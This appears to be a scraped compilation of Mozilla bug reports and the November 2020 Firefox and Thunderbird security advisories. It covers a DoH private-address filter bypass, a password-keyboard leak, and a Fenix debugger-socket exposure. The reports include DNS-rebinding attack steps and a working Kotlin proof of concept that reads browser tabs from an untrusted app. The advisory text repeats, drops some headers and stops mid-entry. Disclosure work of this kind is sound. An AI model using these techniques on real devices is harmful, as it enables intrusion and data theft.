## Summary

When using Firefox with Trusted Recursive Resolver (TRR), private IP addresses are

rejected by default (`network.trr.allow-rfc1918=false`). This protection can prevent

browser-based attacks of machines located on the LAN such as DNS-rebinding attacks.

However, this protection can be bypassed by using a IPv4-mapped IPV6 address

(eg. ::ffff:192.168.1.254).

This has been tested with Firefox Nightly 84.0a1 (2020-10-21) (64 bits) on Debian testing.

## Example

Let's create some domain names records:

```
$ dig @1.1.1.1 +short A wat4.urdhr.fr
::ffff:192.168.1.254
$ dig @1.1.1.1 +short AAAA wat6.urdhr.fr
::ffff:192.168.1.254

```

Let's check the are actually resolved by the DoH resolver

we are using:

```
import dns.query
import dns.message
resolver = "https://cloudflare-dns.com/dns-query"
dns.query.https(dns.message.make_query("wat4.urdhr.fr", "A"), resolver).answer
# => [<DNS wat4.urdhr.fr. IN A RRset: [<192.168.1.254>]>]
dns.query.https(dns.message.make_query("wat6.urdhr.fr", "AAAA"), resolver).answer
# => [<DNS wat6.urdhr.fr. IN AAAA RRset: [<::ffff:192.168.1.254>]>]

```

When using TRR and `network.trr.allow-rfc1918=false`,

* <http://wat4.urdhr.fr> is not reachable in TRR

  mode because the private IP address is rejected by Firefox;
* <http://wat6.urdhr.fr> however, is reachable

  (assuming a web server is running on this IP address and port).

As far as I understand, the process is as follow:

1. the name is resolved to IPv6 ffff:192.168.1.254;
2. this IPv6 address is not considered a private IP address by `NetAddr::IsIPAddrLocal()`;
3. this IPv6 address generates a `AF_INET6` address in `DOHresp::Add()`;
4. this `AF_INET6` is passed to kernel;
5. kernel connects to 192.168.1.256.

## Code snippets

NetAddr derivation from DNS bytes:

```
nsresult DOHresp::Add(uint32_t TTL, unsigned char* dns, unsigned int index,
                      uint16_t len, bool aLocalAllowed) {
  NetAddr addr;
  if (4 == len) {
    // IPv4
    addr.inet.family = AF_INET;
    addr.inet.port = 0;  // unknown
    addr.inet.ip = ntohl(get32bit(dns, index));
  } else if (16 == len) {
    // IPv6
    addr.inet6.family = AF_INET6;
    addr.inet6.port = 0;      // unknown
    addr.inet6.flowinfo = 0;  // unknown
    addr.inet6.scope_id = 0;  // unknown
    for (int i = 0; i < 16; i++, index++) {
      addr.inet6.ip.u8[i] = dns[index];
    }
  } else {
    return NS_ERROR_UNEXPECTED;
  }

  if (addr.IsIPAddrLocal() && !aLocalAllowed) {

    return NS_ERROR_FAILURE;
  }

  // While the DNS packet might return individual TTLs for each address,
  // we can only return one value in the AddrInfo class so pick the
  // lowest number.
  if (mTtl < TTL) {
    mTtl = TTL;
  }

  if (LOG_ENABLED()) {
    char buf[128];
    addr.ToStringBuffer(buf, sizeof(buf));
    LOG(("DOHresp:Add %s\n", buf));
  }
  mAddresses.AppendElement(addr);
  return NS_OK;
}

```

Checking if IP address is private:

```
bool NetAddr::IsIPAddrLocal() const {
  const NetAddr* addr = this;

  // IPv4 RFC1918 and Link Local Addresses.
  if (addr->raw.family == AF_INET) {
    uint32_t addr32 = ntohl(addr->inet.ip);
    if (addr32 >> 24 == 0x0A ||    // 10/8 prefix (RFC 1918).
        addr32 >> 20 == 0xAC1 ||   // 172.16/12 prefix (RFC 1918).
        addr32 >> 16 == 0xC0A8 ||  // 192.168/16 prefix (RFC 1918).
        addr32 >> 16 == 0xA9FE) {  // 169.254/16 prefix (Link Local).
      return true;
    }
  }
  // IPv6 Unique and Link Local Addresses.
  if (addr->raw.family == AF_INET6) {
    uint16_t addr16 = ntohs(addr->inet6.ip.u16[0]);
    if (addr16 >> 9 == 0xfc >> 1 ||    // fc00::/7 Unique Local Address.
        addr16 >> 6 == 0xfe80 >> 6) {  // fe80::/10 Link Local Address.
      return true;
    }
  }
  // Not an IPv4/6 local address.
  return false;
}

```
## Tests

These tests should be able to check the expected behavior (in `test_trr.js`):

```
// verify RFC1918 IPv4-mapped address from the server is rejected
add_task(async function test7() {
  dns.clearCache(true);
  Services.prefs.setIntPref("network.trr.mode", 3); // TRR-only
  Services.prefs.setCharPref(
    "network.trr.uri",
    `https://foo.example.com:${h2Port}/doh?responseIP=::ffff.192.168.0.1`
  );
  let [, , inStatus] = await new DNSListener(
    "rfc1918.example.com",
    undefined,
    false
  );
  Assert.ok(
    !Components.isSuccessCode(inStatus),
    `${inStatus} should be an error code`
  );
});

// verify RFC1918 IPv4-mapped address from the server is fine when told so
add_task(async function test8() {
  dns.clearCache(true);
  Services.prefs.setIntPref("network.trr.mode", 3); // TRR-only
  Services.prefs.setCharPref(
    "network.trr.uri",
    `https://foo.example.com:${h2Port}/doh?responseIP=::ffff.192.168.0.1`
  );
  Services.prefs.setBoolPref("network.trr.allow-rfc1918", true);
  await new DNSListener("rfc1918.example.com", "192.168.0.1");
});

```
## Additional Considerations

It would probably make sense to be able to reject the following networks

as well:

* 0.0.0.0/24
* 127.0.0.0/8
* ::1/128

These can be used for DNS-rebinding attacks on the local machine.

What TRR mode do you use? I'm pretty sure by default we simply bypass DoH for RFC1918 addresses and resolve them locally. It's not a protection, it's because the remote TRR isn't going to know anything about your local network. However, if you've disabled fallback then maybe you get some accidental protection.

We have other proposals to protect against local connections: see "CORS for RFC1918" proposals.

Dragana: is the first bit correct? What is the purpose of the `network.trr.allow-rfc1918` pref

> What TRR mode do you use?

I'm using `network.trr.mode=2`.

> I'm pretty sure by default we simply bypass DoH for RFC1918 addresses

I'm not sure I understand this. I think you are talking about the fact that when I'm visiting <http://192.168.0.1>, DoH won't be used to resolve 192.168.0.1 into an IP address.

This is not what `network.trr.allow-rfc1918` is about.

> What is the purpose of the network.trr.allow-rfc1918 pref

As far as I understand, `network.trr.allow-rfc1918=true` tells that when I'm resolving [www.example.com](http://www.example.com) into an IP address (for example because I'm visiting <http://www.example.com>), Firefox will ignore any private IP address obtained over DoH, i.e. :

1. Firefox want to connect to <http://www.example.com>
2. Firefox tries to resolve [www.example.com](http://www.example.com) using DoH
3. DoH resolver answers with 198.168.0.1
4. address is ignored by Firefox (when `network.trr.allow-rfc1918=true`)

I suppose this feature is implemented as protection against DNS-based attacks. In particular, this block many DNS-rebinding attacks against vulnerable services on the LAN.

Some resolvers have support for blocking private IP addresses [1] this . For example, the resolvers of my ISP implement this feature [2] (I would argue that this practice is questionable). By enabling TRR on Firefox, the local/ISP resolvers are bypassed. So, enabling TRR might end up opening DNS-rebinding attacks

Note: `network.trr.allow-rfc1918` controls `aLocalAllowed` in `DOHresp::Add()` which is called when processing a DoH response.

> We have other proposals to protect against local connections: see "CORS for RFC1918" proposals.

Good to know. I was not aware of this! I'll look at this.

Normally these shouldn't be a problem - the loaded page can always try to access [http://127.0.0.1:[port]](http://127.0.0.1:%5Bport%5D) regardless of the domain. We might add a pref for these anyways, but I don't think we need to change the default unless you can think of a way to exploit this.

> the loaded page can always try to access [http://127.0.0.1:[port]](http://127.0.0.1:%5Bport%5D) regardless of the domain.

Yes but the same thing can be said of [http://192.168.0.1:[port]](http://192.168.0.1:%5Bport%5D).

For both cases (private and localhost IP address) , the problem (in the case of DNS-rebinding attacks) is that these endpoints are accessed while being considered an other origin (eg. [www.example.com](http://www.example.com)).

> unless you can think of a way to exploit this.

DNS-rebinding attacks can be conducted against 127.0.0.1 (or 0.0.0.0, ::1) juste as well:

1. user visits <http://www.example.com:1234>
2. Browser looks up [www.example.com](http://www.example.com) and gets 10.0.0.1
3. Browse connects to 10.0.0.1:1234 and receives malicious JavaScript code
4. Malicious JS code calls `fetch("/some_resource")`
5. Browser looks up [www.example.com](http://www.example.com) again and gets 127.0.0.1
6. Browser makes GET `http://www.example.com:1234/some_resource` against 127.0.0.1:1234
7. Browser sees the request as being same-origin and exposes response to JS code
8. Browser exfiltrates response to other.example.com

While this example is about a `GET`, we could make other kind of requests as well.

Woops, in steps (2) and (3), the IP address was meant to be [an example one](https://tools.ietf.org/html/rfc5737) (eg. 192.0.2.1).

Do you think we should do something when a resolver returns one of these IPs?

I think right now we don't have any specific handling for 0.0.0.0, even though it could be used to connect to localhost.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Unclear how easy it would be to actually exploit this.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Yes
* **Which older supported branches are affected by this flaw?**: all
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Easy to port to esr78
* **How likely is this patch to cause regressions; how much testing does it need?**: Low risk of regressions. This patch ensures that we apply the same checks to IPv4 mapped IPv6 addresses.

It would probably make sense to consider all these IP as "private".

See a [related ticket](https://github.com/WICG/cors-rfc1918/issues/24) I opened about cors-rfc1918.

This; and the test, are okay to land and request uplift. Reproducing the issue is trivial from the patch, so there is no need to delay the test and incur the cognitive overhead of remembering to land it later.

I think we ought to try in a separate mechanism that's easy to revert (e.g., with a pref). There's a risk this will break stuff for our users when we block things resolving to localhost. I'm not too concerned about 0.0.0.0 though.

# Mozilla Foundation Security Advisory 2020-51

## Security Vulnerabilities fixed in Firefox ESR 78.5

Announced
November 17, 2020
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 78.5

#### [#CVE-2020-26951: Parsing mismatches could confuse and bypass security sanitizer for chrome privileged code](#CVE-2020-26951)

Reporter
Irvan Kurniawan (@sourc7)
Impact
high
##### Description

A parsing and event loading mismatch in Firefox's SVG code could have allowed load events to fire, even after sanitization. An attacker already capable of exploiting an XSS vulnerability in privileged internal pages could have used this attack to bypass our built-in sanitizer.

##### References

* [Bug 1667113](https://bugzilla.mozilla.org/show_bug.cgi?id=1667113)

#### [#CVE-2020-16012: Variable time processing of cross-origin images during drawImage calls](#CVE-2020-16012)

Reporter
Aleksejs Popovs
Impact
moderate
##### Description

When drawing a transparent image on top of an unknown cross-origin image, the Skia library `drawImage` function took a variable amount of time depending on the content of the underlying image. This resulted in potential cross-origin information exposure of image content through timing side-channel attacks.

##### References

* [Bug 1642028](https://bugzilla.mozilla.org/show_bug.cgi?id=1642028)

#### [#CVE-2020-26953: Fullscreen could be enabled without displaying the security UI](#CVE-2020-26953)

Reporter
Abdulrahman Alqabandi of Microsoft Browser Vulnerability Research
Impact
moderate
##### Description

It was possible to cause the browser to enter fullscreen mode without displaying the security UI; thus making it possible to attempt a phishing attack or otherwise confuse the user.

##### References

* [Bug 1656741](https://bugzilla.mozilla.org/show_bug.cgi?id=1656741)

#### [#CVE-2020-26956: XSS through paste (manual and clipboard API)](#CVE-2020-26956)

Reporter
Irvan Kurniawan (@sourc7)
Impact
moderate
##### Description

In some cases, removing HTML elements during sanitization would keep existing SVG event handlers and therefore lead to XSS.

##### References

* [Bug 1666300](https://bugzilla.mozilla.org/show_bug.cgi?id=1666300)

#### [#CVE-2020-26958: Requests intercepted through ServiceWorkers lacked MIME type restrictions](#CVE-2020-26958)

Reporter
Moti Harmats
Impact
moderate
##### Description

Firefox did not block execution of scripts with incorrect MIME types when the response was intercepted and cached through a ServiceWorker. This could lead to a cross-site script inclusion vulnerability, or a Content Security Policy bypass.

##### References

* [Bug 1669355](https://bugzilla.mozilla.org/show_bug.cgi?id=1669355)

#### [#CVE-2020-26959: Use-after-free in WebRequestService](#CVE-2020-26959)

Reporter
Bharadwaj Machiraju
Impact
moderate
##### Description

During browser shutdown, reference decrementing could have occured on a previously freed object, resulting in a use-after-free, memory corruption, and a potentially exploitable crash.

##### References

* [Bug 1669466](https://bugzilla.mozilla.org/show_bug.cgi?id=1669466)

#### [#CVE-2020-26960: Potential use-after-free in uses of nsTArray](#CVE-2020-26960)

Reporter
Zijie Zhao
Impact
moderate
##### Description

If the `Compact()` method was called on an nsTArray, the array could have been reallocated without updating other pointers, leading to a potential use-after-free and exploitable crash.

##### References

* [Bug 1670358](https://bugzilla.mozilla.org/show_bug.cgi?id=1670358)

#### [#CVE-2020-15999: Heap buffer overflow in freetype](#CVE-2020-15999)

Reporter
Sergei Glazunov of Google Project Zero
Impact
moderate
##### Description

In Freetype, if PNG images were embedded into fonts, the `Load_SBit_Png` function contained an integer overflow that led to a heap buffer overflow, memory corruption, and an exploitable crash.
*Note: While Project Zero did discover instances of this vulnerability being exploited in the wild against Chrome, in Firefox this vulnerability is only triggerable if a rarely-used, hidden preference is toggled, and only affected Linux and Android operating systems. Other operating systems are unaffected; and Linux and Android are unaffected in the default configuration.*

##### References

* [Bug 1672223](https://bugzilla.mozilla.org/show_bug.cgi?id=1672223)

#### [#CVE-2020-26961: DoH did not filter IPv4 mapped IP Addresses](#CVE-2020-26961)

Reporter
Gabriel Corona
Impact
moderate
##### Description

When DNS over HTTPS is in use, it intentionally filters RFC1918 and related IP ranges from the responses as these do not make sense coming from a DoH resolver. However when an IPv4 address was mapped through IPv6, these addresses were erroneously let through, leading to a potential DNS Rebinding attack.

##### References

* [Bug 1672528](https://bugzilla.mozilla.org/show_bug.cgi?id=1672528)

#### [#CVE-2020-26965: Software keyboards may have remembered typed passwords](#CVE-2020-26965)

Reporter
Makoto Kato
Impact
low
##### Description

Some websites have a feature "Show Password" where clicking a button will change a password field into a textbook field, revealing the typed password. If, when using a software keyboard that remembers user input, a user typed their password and used that feature, the type of the password field was changed, resulting in a keyboard layout change and the possibility for the software keyboard to remember the typed password.

##### References

* [Bug 1661617](https://bugzilla.mozilla.org/show_bug.cgi?id=1661617)

#### [#CVE-2020-26966: Single-word search queries were also broadcast to local network](#CVE-2020-26966)

Reporter
tiebuchen
Impact
low
##### Description

Searching for a single word from the address bar caused an mDNS request to be sent on the local network searching for a hostname consisting of that string; resulting in an information leak.
*Note: This issue only affected Windows operating systems. Other operating systems are unaffected.*

* [Bug 1663571](https://bugzilla.mozilla.org/show_bug.cgi?id=1663571)

#### [#CVE-2020-26968: Memory safety bugs fixed in Firefox 83 and Firefox ESR 78.5](#CVE-2020-26968)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Steve Fink, Jason Kratzer, Randell Jesup, Christian Holler, and Byron Campen reported memory safety bugs present in Firefox 82 and Firefox ESR 78.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

#### [#CVE-2020-26951: Parsing mismatches could confuse and bypass security sanitizer for chrome privileged code](#CVE-2020-26951)

Reporter
Irvan Kurniawan (@sourc7)
Impact
high
##### Description

A parsing and event loading mismatch in Firefox's SVG code could have allowed load events to fire, even after sanitization. An attacker already capable of exploiting an XSS vulnerability in privileged internal pages could have used this attack to bypass our built-in sanitizer.

#### [#CVE-2020-26952: Out of memory handling of JITed, inlined functions could lead to a memory corruption](#CVE-2020-26952)

Reporter
Gary Kwong
Impact
high
##### Description

Incorrect bookkeeping of functions inlined during JIT compilation could have led to memory corruption and a potentially exploitable crash when handling out-of-memory errors.

##### References

* [Bug 1667685](https://bugzilla.mozilla.org/show_bug.cgi?id=1667685)

#### [#CVE-2020-16012: Variable time processing of cross-origin images during drawImage calls](#CVE-2020-16012)

Reporter
Aleksejs Popovs
Impact
moderate
##### Description

When drawing a transparent image on top of an unknown cross-origin image, the Skia library `drawImage` function took a variable amount of time depending on the content of the underlying image. This resulted in potential cross-origin information exposure of image content through timing side-channel attacks.

#### [#CVE-2020-26953: Fullscreen could be enabled without displaying the security UI](#CVE-2020-26953)

Reporter
Abdulrahman Alqabandi of Microsoft Browser Vulnerability Research
Impact
moderate
##### Description

It was possible to cause the browser to enter fullscreen mode without displaying the security UI; thus making it possible to attempt a phishing attack or otherwise confuse the user.

#### [#CVE-2020-26954: Local spoofing of web manifests for arbitrary pages in Firefox for Android](#CVE-2020-26954)

Reporter
Muneaki Nishimura
Impact
moderate
##### Description

When accepting a malicious intent from other installed apps, Firefox for Android accepted manifests from arbitrary file paths and allowed declaring webapp manifests for other origins. This could be used to gain fullscreen access for UI spoofing and could also lead to cross-origin attacks on targeted websites.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

#### [#CVE-2020-26955: Cookies set during file downloads are shared between normal and Private Browsing Mode in Firefox for Android](#CVE-2020-26955)

Reporter
Muneaki Nishimura
Impact
moderate
##### Description

When a user downloaded a file in Firefox for Android, if a cookie is set, it would have been re-sent during a subsequent file download operation on the same domain, regardless of whether the original and subsequent request were in private and non-private browsing modes.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

* [Bug 1663261](https://bugzilla.mozilla.org/show_bug.cgi?id=1663261)

#### [#CVE-2020-26956: XSS through paste (manual and clipboard API)](#CVE-2020-26956)

Reporter
Irvan Kurniawan (@sourc7)
Impact
moderate
##### Description

In some cases, removing HTML elements during sanitization would keep existing SVG event handlers and therefore lead to XSS.

#### [#CVE-2020-26957: OneCRL was not working in Firefox for Android](#CVE-2020-26957)

Reporter
Kevin Brosnan
Impact
moderate
##### Description

OneCRL was non-functional in the new Firefox for Android due to a missing service initialization. This could result in a failure to enforce some certificate revocations.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1667179](https://bugzilla.mozilla.org/show_bug.cgi?id=1667179)

#### [#CVE-2020-26958: Requests intercepted through ServiceWorkers lacked MIME type restrictions](#CVE-2020-26958)

Reporter
Moti Harmats
Impact
moderate
##### Description

Firefox did not block execution of scripts with incorrect MIME types when the response was intercepted and cached through a ServiceWorker. This could lead to a cross-site script inclusion vulnerability, or a Content Security Policy bypass.

* [Bug 1669355](https://bugzilla.mozilla.org/show_bug.cgi?id=1669355)

#### [#CVE-2020-26959: Use-after-free in WebRequestService](#CVE-2020-26959)

Reporter
Bharadwaj Machiraju
Impact
moderate
##### Description

During browser shutdown, reference decrementing could have occured on a previously freed object, resulting in a use-after-free, memory corruption, and a potentially exploitable crash.

##### References

* [Bug 1669466](https://bugzilla.mozilla.org/show_bug.cgi?id=1669466)

#### [#CVE-2020-26960: Potential use-after-free in uses of nsTArray](#CVE-2020-26960)

Reporter
Zijie Zhao
Impact
moderate
##### Description

If the `Compact()` method was called on an nsTArray, the array could have been reallocated without updating other pointers, leading to a potential use-after-free and exploitable crash.

##### References

* [Bug 1670358](https://bugzilla.mozilla.org/show_bug.cgi?id=1670358)

#### [#CVE-2020-15999: Heap buffer overflow in freetype](#CVE-2020-15999)

Reporter
Sergei Glazunov of Google Project Zero
Impact
moderate
##### Description

In Freetype, if PNG images were embedded into fonts, the `Load_SBit_Png` function contained an integer overflow that led to a heap buffer overflow, memory corruption, and an exploitable crash.
*Note: While Project Zero did discover instances of this vulnerability being exploited in the wild against Chrome, in Firefox this vulnerability is only triggerable if a rarely-used, hidden preference is toggled, and only affected Linux and Android operating systems. Other operating systems are unaffected; and Linux and Android are unaffected in the default configuration.*

* [Bug 1672223](https://bugzilla.mozilla.org/show_bug.cgi?id=1672223)

#### [#CVE-2020-26961: DoH did not filter IPv4 mapped IP Addresses](#CVE-2020-26961)

Reporter
Gabriel Corona
Impact
moderate
##### Description

When DNS over HTTPS is in use, it intentionally filters RFC1918 and related IP ranges from the responses as these do not make sense coming from a DoH resolver. However when an IPv4 address was mapped through IPv6, these addresses were erroneously let through, leading to a potential DNS Rebinding attack.

#### [#CVE-2020-26962: Cross-origin iframes supported login autofill](#CVE-2020-26962)

Reporter
Paul Stone
Impact
low
##### Description

Cross-origin iframes that contained a login form could have been recognized by the login autofill service, and populated. This could have been used in clickjacking attacks, as well as be read across partitions in dynamic first party isolation.

Reporter
Sachin Raste
Impact
low
##### Description

Repeated calls to the history and location interfaces could have been used to hang the browser. This was addressed by introducing rate-limiting to these API calls.

* [Bug 1314912](https://bugzilla.mozilla.org/show_bug.cgi?id=1314912)

#### [#CVE-2020-26964: Firefox for Android's Remote Debugging via USB could have been abused by untrusted apps on older versions of Android](#CVE-2020-26964)

Reporter
Muneaki Nishimura
Impact
low
##### Description

If the Remote Debugging via USB feature was enabled in Firefox for Android on an Android version prior to Android 6.0, untrusted apps could have connected to the feature and operated with the privileges of the browser to read and interact with web content. The feature was implemented as a unix domain socket, protected by the Android SELinux policy; however, SELinux was not enforced for versions prior to 6.0. This was fixed by removing the Remote Debugging via USB feature from affected devices.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

* [Bug 1658865](https://bugzilla.mozilla.org/show_bug.cgi?id=1658865)

#### [#CVE-2020-26965: Software keyboards may have remembered typed passwords](#CVE-2020-26965)

Reporter
Makoto Kato
Impact
low
##### Description

Some websites have a feature "Show Password" where clicking a button will change a password field into a textbook field, revealing the typed password. If, when using a software keyboard that remembers user input, a user typed their password and used that feature, the type of the password field was changed, resulting in a keyboard layout change and the possibility for the software keyboard to remember the typed password.

#### [#CVE-2020-26966: Single-word search queries were also broadcast to local network](#CVE-2020-26966)

Reporter
tiebuchen
Impact
low
##### Description

Searching for a single word from the address bar caused an mDNS request to be sent on the local network searching for a hostname consisting of that string; resulting in an information leak.
*Note: This issue only affected Windows operating systems. Other operating systems are unaffected.*

Reporter
Kaizer Soze
Impact
low
##### Description

When listening for page changes with a Mutation Observer, a malicious web page could confuse Firefox Screenshots into interacting with elements other than those that it injected into the page. This would lead to internal errors and unexpected behavior in the Screenshots code.

##### Description

Mozilla developers Randell Jesup, Christian Holler, Jason Kratzer, Byron Campen, and Steve Fink reported memory safety bugs present in Firefox 82 and Firefox ESR 78.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

This may be privacy issue, I file as sec bug at first.

Actually, software keyboard type depends on current `type` attribute of `input` element. If type is password, we change to password layout. So if `type` attribute is changed, keyboard layout is also changed. This is managed by `IMEStateManager` to using `type` and `inputmode`.

But although some web site has "Show password' icon not to mask password input, the following issue occurs.

### Env

Fenix with GBoard. I guess that this occurs on Windows tablet.

### Step

1. Access to [www.google.com](http://www.google.com)
2. Enter google account email address.
3. Focus password field.
4. Click "Show password" icon.

### Actual Result

Keyboard layout is changed to non-password style.

### Actual Google Chrome Result

Even if tapping "Show password" icon, keyboard layout isn't changed. Although I heard from Googler that they consider this situation to keep keyboard layout for password.

I think that Chrome's way is better for password field. Although most software keyboard leans input history if not password layout, "Show password" causes that software keyboard learns inputted password even if this is password field as web site.

Even if focus is moved back again? And even if "Show password" is tapped before getting focus?

(FYI: In the future, [this should be solved without changing the `type` attribute](https://github.com/w3c/csswg-drafts/issues/2495#issuecomment-380397331).)

Set focus then tap "unmask password" icon.

Only in the case we need to support, we can make `IMEStateManager` cache the **first** `type` value when setting IME context.

I think we have a `hasBeenTypePassword` property (webidl attribute) on input elements that can help fix this.

[Bug 1661617](/show_bug.cgi?id=1661617 "RESOLVED FIXED - Changing to <input type=password> to <input type=text> causes software keyboard type is changed to non-password style") - Use password hint for software keyboard.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: This is a kind of privacy issue. When using some web sites such as Google's login page, password field can change to non-masked input when clicking eye icon. Then, inputting password on this situation causes that software keyboard/IME learns input history unfortunately even if it is password. So, attacher have to access physical device to get password that is inputted.

Attacker knows that we set password style layout on some additional conditions from this fix, but it is no way to get password without accessing physical device.

* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: all
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: If text field was password type, and this field is re-used for other thing such as user name, the layout of software keyboard may keep password style.

  But I think that this is too rare case and this new behavior is same as Chrome for Android. So if regression occurs, Chrome will have also same issue.

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: This is privacy issue. IME might learn password input that text box was password box. (Ex. Google's login form can change non-masked input form for password.)
* **User impact if declined**: This is a kind of privacy issue. When using some web sites such as Google's login page, password field can change to non-masked input when clicking eye icon. Then, inputting password on this situation causes that software keyboard/IME learns input history unfortunately even if it is password. So, attacker have to access physical device to get password that is inputted.
* **Fix Landed on Version**: 83
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Low risk for most users. Most users don't use IME and this uses on Windows/Linux IME only.
* **String or UUID changes made by this patch**: no

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.

I'm not sure whether this is a security bug or by design (i.e., already considered & accepted risk), but Fenix's remote debugging socket can be connected from untrusted apps if Android OS version is older than 6.

When user enables "Remote debbuging via USB", Fenix creates an unix domain socket that name is `firefox-debugger-socket`. That socket is not explicitly protected by Fenix itself but it's not connectable from untrusted apps because unix sockets are banned by Android's SELinux policy (below).

[https://android.googlesource.com/platform/external/sepolicy/+/57531cacb40682be4b1189c721fd1e7f25bf3786/untrusted\_app.te#137](https://android.googlesource.com/platform/external/sepolicy/%2B/57531cacb40682be4b1189c721fd1e7f25bf3786/untrusted_app.te#137)

But the SELinux policy was enforced from Android version 6.0 (Marshmallow).

Android older than 6.0 (such as 5.1 Lollipop) allows to use them without any permissions.

As you know Android 5.1 is very old, but still they has about 8% share. Also Mozilla website clearly mentions that Firefox is compatible with Android 4.1 or above devices (below).

<https://support.mozilla.org/en-US/kb/will-firefox-work-my-mobile-device#mobile::m79>

If so, in order to protect the debugger socket, there should be some protections in Fenix itself, for example, hiding "Remote debbuging via USB" button on old devices.

The following Kotlin code can reproduce this issue on Nexus 6 emulator with Android 5.1 stock image. See also attached animation gif for the demo.

```
var socket = LocalSocket()
var addr = LocalSocketAddress("org.mozilla.fenix/firefox-debugger-socket")
socket.connect(addr)
Toast.makeText(applicationContext, "Connected", Toast.LENGTH_SHORT).show()
var reader: Scanner = Scanner(socket.getInputStream())
var writer: OutputStream = socket.getOutputStream()
reader.nextLine()

// List tab request
var req = "48:{\"type\":\"listTabs\",\"favicons\":false,\"to\":\"root\"}"
writer.write((req + '\n').toByteArray(Charset.defaultCharset()))

// Parse response
var resp = reader.nextLine().toString()
var index = resp.indexOf("{", 0)
var tabs = JSONObject(resp.substring(index)).getJSONArray("tabs")

// Show tab info
for(i in 0 until tabs.length()) {
    var tab = tabs.getJSONObject(i)
    var outerWindowID = tab.getInt("outerWindowID")
    var title = tab.getString("title")
    var url = tab.getString("url")
    var output = "#${i+1} Window ID: ${outerWindowID}\nTitle: ${title}\n URL: ${url}"
    Toast.makeText(applicationContext, output, Toast.LENGTH_LONG).show()
}
socket.close()

Thank you for providing a demo!

I think this is sec-low. I could be convinced that this is sec-moderate if the affected Android versions weren't so old. It still requires the user to run a bad app.

We still support Android 5.0 and 5.1. It is not 8% of users it is under 4%. We should disable this for Android 5.0 and 5.1. Should be able to stop this by disabling the USB debugging option in the affected Android versions. We should document it at [https://developer.mozilla.org/en-US/docs/Tools/about:debugging#Connecting\_to\_a\_remote\_device](https://developer.mozilla.org/en-US/docs/Tools/about%3Adebugging#Connecting_to_a_remote_device) that Android 5.0 and 5.1 do not have this feature.

# Mozilla Foundation Security Advisory 2020-52

## Security Vulnerabilities fixed in Thunderbird 78.5

Announced
November 17, 2020
Impact
high
Products
Thunderbird
Fixed in

* Thunderbird 78.5

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2020-26951: Parsing mismatches could confuse and bypass security sanitizer for chrome privileged code](#CVE-2020-26951)

Reporter
Irvan Kurniawan (@sourc7)
Impact
high
##### Description

A parsing and event loading mismatch in Thunderbird's SVG code could have allowed load events to fire, even after sanitization. An attacker already capable of exploiting an XSS vulnerability in privileged internal pages could have used this attack to bypass our built-in sanitizer.

#### [#CVE-2020-16012: Variable time processing of cross-origin images during drawImage calls](#CVE-2020-16012)

Reporter
Aleksejs Popovs
Impact
moderate
##### Description

